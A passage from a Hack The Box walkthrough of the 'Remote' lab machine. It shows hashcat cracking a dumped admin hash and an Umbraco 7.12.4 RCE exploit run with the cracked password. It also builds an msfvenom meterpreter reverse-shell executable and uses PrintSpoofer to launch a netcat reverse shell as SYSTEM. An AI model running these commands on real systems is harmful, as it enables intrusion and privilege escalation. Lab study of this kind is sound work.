+</span></span><span style="display:flex;"><span>ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={&#34;hashAlgorithm&#34;:&#34;HMACSHA256&#34;}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
+</span></span></code></pre></div><p>We crack the admin hash.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$hashcat -m <span style="color:#ae81ff">100</span> admin_hash /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span></code></pre></div><p>Then we are able to log into the Umbraco service with those credentials.
+<img src="/images/Remote/Umbraco" alt="Umbraco"></p>
+<p>Looking around, we try to upload a web shell but can&rsquo;t get anything to work. We check the version number which is 7.12.4. Let&rsquo;s Google for exploits. Looks like there is a <a href="https://www.exploit-db.com/exploits/49488">RCE vulnerability</a>. We download the exploit code and attempt to use it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$python3 exploit.py -u admin@htb.local -p baconandcheese -i <span style="color:#e6db74">&#39;http://10.10.10.180&#39;</span> -c whoami
+</span></span><span style="display:flex;"><span>iis apppool\defaultapppool
+</span></span></code></pre></div><p>It works! Let&rsquo;s get a real shell. First we use msfvenom to generate a malicious exectuable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.14.20 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">8443</span> -f exe &gt; backup.exe
+</span></span><span style="display:flex;"><span>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+</span></span><span style="display:flex;"><span>[-] No arch selected, selecting arch: x64 from the payload
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: 510 bytes
+</span></span><span style="display:flex;"><span>Final size of exe file: 7168 bytes
+</span></span></code></pre></div><p>Then we upload our executable to Umbraco and find the location where it is stored.
+<img src="/images/Remote/backup.exe" alt="Backup.exe"></p>
+<p>Now we set up or Metasploit handler and run the executable using the exploit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$python3 exploit.py -u admin@htb.local -p baconandcheese -i <span style="color:#e6db74">&#39;http://10.10.10.180&#39;</span> -c powershell.exe -a <span style="color:#e6db74">&#39;c:/inetpub/wwwroot/media/1035/backup.exe&#39;</span>
+</span></span></code></pre></div><p>And we get a shell!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; exploit
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[*] Started reverse TCP handler on 10.10.14.20:8443
+</span></span><span style="display:flex;"><span>[*] Sending stage (200774 bytes) to 10.10.10.180
+</span></span><span style="display:flex;"><span>[*] Meterpreter session 1 opened (10.10.14.20:8443 -&gt; 10.10.10.180:50003) at 2025-02-05 14:05:48 -0500
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>(Meterpreter 1)(C:\windows\system32\inetsrv) &gt; getuid
+</span></span><span style="display:flex;"><span>Server username: IIS APPPOOL\DefaultAppPool
+</span></span><span style="display:flex;"><span>(Meterpreter 1)(C:\windows\system32\inetsrv) &gt;
+</span></span></code></pre></div><p>We got to the Public user&rsquo;s desktop and grab the user flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>c:\Users\Public\Desktop&gt;type user.txt
+</span></span><span style="display:flex;"><span>type user.txt
+</span></span><span style="display:flex;"><span>a2ec7016d01ba70fc19707b8bae1eff7
+</span></span></code></pre></div><p>We notice that this user has SeImpersonatePrivilege</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>c:\Users\Public\Desktop&gt;whoami /priv
+</span></span><span style="display:flex;"><span>whoami /priv
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>PRIVILEGES INFORMATION
+</span></span><span style="display:flex;"><span>----------------------
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Privilege Name                Description                               State
+</span></span><span style="display:flex;"><span>============================= ========================================= ========
+</span></span><span style="display:flex;"><span>SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+</span></span><span style="display:flex;"><span>SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+</span></span><span style="display:flex;"><span>SeAuditPrivilege              Generate security audits                  Disabled
+</span></span><span style="display:flex;"><span>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+</span></span><span style="display:flex;"><span>SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+</span></span><span style="display:flex;"><span>SeCreateGlobalPrivilege       Create global objects                     Enabled
+</span></span><span style="display:flex;"><span>SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</span></span></code></pre></div><p>Let&rsquo;s check the version.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>c:\inetpub\wwwroot\Media\1036&gt;systeminfo
+</span></span><span style="display:flex;"><span>systeminfo
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Host Name:                 REMOTE
+</span></span><span style="display:flex;"><span>OS Name:                   Microsoft Windows Server 2019 Standard
+</span></span><span style="display:flex;"><span>OS Version:                10.0.17763 N/A Build 17763
+</span></span><span style="display:flex;"><span>OS Manufacturer:           Microsoft Corporation
+</span></span><span style="display:flex;"><span>OS Configuration:          Standalone Server
+</span></span><span style="display:flex;"><span>OS Build Type:             Multiprocessor Free
+</span></span><span style="display:flex;"><span>Registered Owner:          Windows User
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span></code></pre></div><p>Since it&rsquo;s Windows 2019, we need to use PrintSpoofer instead of JuicyPotato. We also start a nc listener to catch the shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>c:\inetpub\wwwroot\Media\1038&gt;printspoofer64.exe -c &#34;c:/inetpub/wwwroot/Media/1037/nc.exe 10.10.14.20 9443 -e cmd&#34;
+</span></span><span style="display:flex;"><span>printspoofer64.exe -c &#34;c:/inetpub/wwwroot/Media/1037/nc.exe 10.10.14.20 9443 -e cmd&#34;
+</span></span><span style="display:flex;"><span>[+] Found privilege: SeImpersonatePrivilege
+</span></span><span style="display:flex;"><span>[+] Named pipe listening...
+</span></span><span style="display:flex;"><span>[+] CreateProcessAsUser() OK
+</span></span></code></pre></div><p>And we have our shell as NT AUTHORITY\SYSTEM!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$nc -nlvp <span style="color:#ae81ff">9443</span>
+</span></span><span style="display:flex;"><span>listening on [any] 9443 ...
+</span></span><span style="display:flex;"><span>connect to [10.10.14.20] from (UNKNOWN) [10.10.10.180] 50017
+</span></span><span style="display:flex;"><span>Microsoft Windows [Version 10.0.17763.107]
+</span></span><span style="display:flex;"><span>(c) 2018 Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>C:\Windows\system32&gt;whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority\system
+</span></span></code></pre></div><p>We get our root flag on the Administrator&rsquo;s desktop.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>c:\Users\Administrator\Desktop&gt;type root.txt
+</span></span><span style="display:flex;"><span>type root.txt
+</span></span><span style="display:flex;"><span>35d2b52add6112ba4b3bc5a585816f21
+</span></span></code></pre></div>
+</content>
+<p>
+  
+  <a href="https://jordangalida.github.io/blog/htb/">#HTB</a>
+  
+  <a href="https://jordangalida.github.io/blog/pentesting/">#Pentesting</a>
+  
+</p>
+
+  </main>
+  <footer>Made with <a href="https://github.com/janraasch/hugo-bearblog/">Hugo ʕ•ᴥ•ʔ Bear</a>
+</footer>
+
+    
+</body>
+
+</html>
